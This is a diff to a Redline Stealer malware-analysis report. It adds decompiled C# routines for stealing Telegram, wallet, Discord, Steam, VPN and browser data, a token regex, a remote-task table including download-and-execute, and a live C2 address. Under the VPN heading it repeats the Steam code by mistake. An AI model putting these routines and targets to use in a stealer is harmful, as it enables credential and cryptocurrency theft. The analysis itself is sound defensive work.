@@ -189,6 +189,13 @@ ID: <ProcessId>, Name: <Name>, CommandLine: <CommandLine>
 
 To collect languages, *Redline Stealer* iterates `InputLanguages.InstalledInputLanguages`, appending the language `EnglishName` to a list of strings. Once the results have been collected, they are sent to the C2 server.
 
+```csharp
+public static void GetLanguages(ConnectionProvider connection, SettingsStruct settings, ref ResultStruct result)
+	{
+		result.SystemInfo.Languages = SystemInfoHelper.AvailableLanguages();
+	}
+```
+
 #### GetTelegramProfiles
 
 To scan for profiles, *Redline Stealer* calls the `FileScanning.Search` method, which takes an array of scanners classes to process. In this case, the only scanner class that is passed is `TelegramScanner`. Each scanner has two methods, `Find` to locate interesting directories, and `Collect` to obtain information. 
@@ -207,9 +214,23 @@ Next, if *Redline Stealer* is unable to find a currently running process of `Tel
 
 *Redline Stealer* in this process considers any filenames with a length of 16 in the Telegram `\tdata` folder a potential profile.
 
-
+```csharp
+public static void StealTelegram(ConnectionProvider connection, SettingsStruct settings, ref ResultStruct result)
+	{
+		if (settings.Telegram)
+		{
+			List<FileStruct> list = FileScanning.Search(new Extractor[]
+			{
+				new TelegramScanner()
+			});
+			result.SystemInfo.TelegramCredentials = list;
+		}
+	}
+```
 
 #### StealWallets
+
+To steal cryptocurrency wallets, Redline Stealer checks if the Wallets module is enabled. If enabled, Redline Stealer initializes the first wallet module, passing the BrowserPath configuration from the C2, and initializes the crypto wallets in Figure placeholder, by splitting them by lines and into key value pairs using the delimiter `|`. 
 
 ```text
 ffnbelfdoeiohenkjibnmadjiehjhajb|YoroiWallet
@@ -279,24 +300,167 @@ dngmlblcodfobpdpecaadgfbcggfjfnm|MaiarDeFiWallet
 bhghoamapcdpbohphigoooaddinpkbai|Authenticator
 ookjlbkiijinhpmnjffcofjonbfbgaoc|TempleWallet
 ```
+*Figure placeholder. Redline Stealer Wallets*
 
-#### Exfiltration
+The key is the path expected to match the wallet, and the value is the wallet name. Next, *Redline Stealer* iterates over the browser paths searching for Login Data, Web Data and Cookies. For each of the file paths matching these strings, Redline Stealer collects the valid paths for the crypto currency wallets (Figure placeholder).
 
-Placeholder
+```text
+<browser-name>_<user-data-path>_<crypto_wallet>
+"%Path%/Local Extension Settings/afbcbjpbpfadlkmhmclhkeeodmamcflc"
+```
+
+Next, Redline Stealer searches for the files wallet.dat and wallet. These results are returned in a list of scanner results.
+
+Once completed, *Redline Stealer* collects the files identified and sends them to the C2 server.
+
+```csharp
+public static void StealWallets(ConnectionProvider connection, SettingsStruct settings, ref ResultStruct result)
+	{
+		if (settings.Wallets)
+		{
+			SearchCryptoWallets searchCryptoWallets = new SearchCryptoWallets();
+			searchCryptoWallets.Init(settings.ChromiumBrowserPaths);
+			List<FileStruct> list = FileScanning.Search(new Extractor[]
+			{
+				new WalletDats(),
+				searchCryptoWallets
+			});
+			list.AddRange(ConfigReader.Read(settings.AdditionalWallets));
+			result.SystemInfo.WalletResults = list;
+		}
+	}
+```
+
+#### StealDiscord
+
+To steal Discord tokens, Redline Stealer checks if the Discord module is enabled. If the module is enabled, Redline Stealer checks the directory `%AppData%\\discord\\Local Storage\\leveldb` for the file extensions `.log` and `.ldb.` The files collected with these extensions are searched with the regex ``[A-Za-z\\d]{24}\\.[\\w-]{6}\\.[\\w-]{27}``. If a match is found, Redline Stealer adds the Discord token to a structure containing the tokens. Once completed, they are added to the SystemInfo structure, which is later sent to the C2 server.
+
+```csharp
+public static void StealDiscord(ConnectionProvider connection, SettingsStruct settings, ref ResultStruct result)
+	{
+		if (settings.Discord)
+		{
+			SystemInfo id = result.SystemInfo;
+			IEnumerable<FileStruct> tokens = Discord.GetTokens();
+			id.DiscordTokens = ((tokens != null) ? tokens.ToList<FileStruct>() : null);
+		}
+	}
+```
+
+## StealSteam
+
+To steal Steam credentials, *Redline Stealer* checks if the `StealSteam` module is enabled. If enabled, *Redline Stealer* checks if the registry key `HKCU:\Software\Valve\Steam` if the value `SteamPath` is a directory. If the directory exists, *Redline Stealer* collects files matching the search pattern `*ssfn*` and `*.vdf`. The `ssfn` (Steam Sentry Files) are used by Steam for authentication sessions and the `.vdf` files are used to contain various types of game metadata. These files are later exfiltrated to the C2 server.
+
+```csharp
+public static void StealSteam(ConnectionProvider connection, SettingsStruct settings, ref ResultStruct result)
+	{
+		if (settings.StealSteam)
+		{
+			result.SystemInfo.StealSteam = FileScanning.Search(new Extractor[]
+			{
+				new Steam()
+			});
+		}
+	}
+```
+
+#### StealVPN
+
+To steal Nord VPN credentials, *Redline Stealer* searches the directory `%USERPROFILE%\AppData\Local\NordVPN` with the search pattern `NordVPN.exe*`. If *Redline Stealer* is able to identify a file named user.config, *Redline Stealer* extracts the username and password. 
+
+```csharp
+	public static void StealSteam(ConnectionProvider connection, SettingsStruct settings, ref ResultStruct result)
+	{
+		if (settings.StealSteam)
+		{
+			result.SystemInfo.StealSteam = FileScanning.Search(new Extractor[]
+			{
+				new Steam()
+			});
+		}
+	}
+
+```
+
+To steal OpenVPN credentials, *Redline Stealer* collects files the directory `%USERPROFILE%\\AppData\\Roaming\\OpenVPN Connect\\profiles` using the search pattern `*ovpn`.
+
+To steal ProtonVPN credentials, *Redline Stealer* collects files the directory `%USERPROFILE%\\AppData\\Local\ProtonVPN` using the search pattern `*ovpn`.
+
+```csharp
+public static void StealVPN(ConnectionProvider connection, SettingsStruct settings, ref ResultStruct result)
+	{
+		if (settings.VPN)
+		{
+			result.SystemInfo.NordVPN = NordApp.Find();
+			result.SystemInfo.OpenVPN = FileScanning.Search(new Extractor[]
+			{
+				new OpenVPN()
+			});
+			result.SystemInfo.ProtonVPN = FileScanning.Search(new Extractor[]
+			{
+				new ProtonVPN()
+			});
+		}
+	}
+```
+
+#### StealBrowsers
+
+To steal browser credentials, Redline Stealer iterates over browser paths provided for both Chromium and Mozilla based browsers from the the configuration. To steal the data, *Redline Stealer* iterates over the directories `Login Data`, `Web Data`, `Cookies` and `Extension Cookies`. During this process *Redline Stealer* collects cookies, the browser name, the path to the `User Data` directory, saved passwords, autofill data, and credit cards. Most of the data collected from the browsers is from the sqlite database and is easily decrypted.
+
+```csharp
+public static void BrowserStealer(ConnectionProvider connection, SettingsStruct settings, ref ResultStruct result)
+	{
+		if (settings.Browsers)
+		{
+			List<BrowserCredentials> list = new List<BrowserCredentials>();
+			list.AddRange(Chromium.Steal(settings.ChromiumBrowserPaths));
+			list.AddRange(Mozilla.Steal(settings.MozillaBrowserPaths));
+			result.SystemInfo.BrowserCredentials = list;
+		}
+	}
+```
 
 #### Remote Tasks
 
-Placeholder
+To execute remote tasks, Redline Stealer makes a request to the C2 server. Next, Redline Stealer is able to perform four types of remote tasks. These remote tasks include arbitrary command execution, downloading of files, downloading and execution of files and executing files (Table placeholder).
 
-##### Get Tasks
+| Task                        | Example                                                 | Description                             |
+| --------------------------- | ------------------------------------------------------- | --------------------------------------- |
+| Arbitrary Command Execution | `whoami`                                                  | Execute Command using `cmd /C <command` |
+| Download File               | `http://example.com/example.exe\|%AppData%\\example.exe` | Download a File                         |
+| Download and Execute        | `http://example.com/example.exe\|%AppData%\\example.exe` | Download and Execute a File             |
+| Execute a File              | `C:\Users\example\example.exe`                          | Execute a File                          | 
 
-##### Execute Tasks
-
-Placeholder
+*Table placeholder. Redline Stealer Remote Tasks*
 
 ## Configuration Extraction
 
-Placeholder
+I have created a configuration extractor, which is available [here](https://github.com/c3rb3ru5d3d53c/mwcfg-modules/blob/f1064aea63d11b5069a1839cf2b9d10d43cee1aa/redline/redline.py).
+
+```bash
+mwcfg -m modules/ -i tests/redline/676ae4b1ef05ee0ec754a970cce61a5f8d3093989a58c33087a3a5dca06364aa --pretty | jq
+[
+  {
+    "name": "tests/redline/676ae4b1ef05ee0ec754a970cce61a5f8d3093989a58c33087a3a5dca06364aa",
+    "type": "PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows",
+    "mime": "application/x-dosexec",
+    "md5": "396c2688c0469b0cb0d83167d27eca31",
+    "sha1": "a1f91b8b153d017593119984fbce936c5113a137",
+    "sha256": "676ae4b1ef05ee0ec754a970cce61a5f8d3093989a58c33087a3a5dca06364aa",
+    "configs": [
+      {
+        "hosts": [
+          "95.217.35.153:9678"
+        ],
+        "id": "100822",
+        "family": "redline"
+      }
+    ]
+  }
+]
+```
+*Figure placeholder. Redline Stealer Configuration Extraction*
 
 ## Indicators of Compromise
 
